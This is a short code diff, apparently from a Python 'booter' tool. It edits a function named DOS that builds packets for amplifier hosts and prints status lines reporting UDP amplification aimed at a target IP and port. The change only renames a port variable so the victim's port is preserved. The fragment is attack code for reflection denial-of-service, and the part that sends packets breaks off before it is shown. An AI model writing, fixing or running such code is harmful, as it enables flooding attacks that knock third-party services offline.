@@ -36,9 +36,9 @@ def requests(ip,port,path):
 
 def DOS(ip,port,amp,id,booter,times,path):
     raw_amp = amp.split(':')
-    try:port = raw_amp[1]
-    except:port = 80
-    packet = requests(raw_amp[0],int(port),path)
+    try:port2 = raw_amp[1]
+    except:port2 = 80
+    packet = requests(raw_amp[0],int(port2),path)
     s = HumanBytes.format(len(packet),True)
     print(f'\x1b[38;5;206mID\x1b[38;5;255m=\x1b[38;5;207m{id} \x1b[38;5;196mFrom \x1b[38;5;197m{amp}{path} \x1b[38;5;198mAmplification\x1b[38;5;255m=\x1b[38;5;199m{s} \x1b[38;5;200mto \x1b[38;5;76m{ip}\x1b[38;5;255m:\x1b[38;5;77m{port} \x1b[38;5;51m[ \x1b[38;5;50mUDP \x1b[38;5;51m]\x1b[0m')
     try:
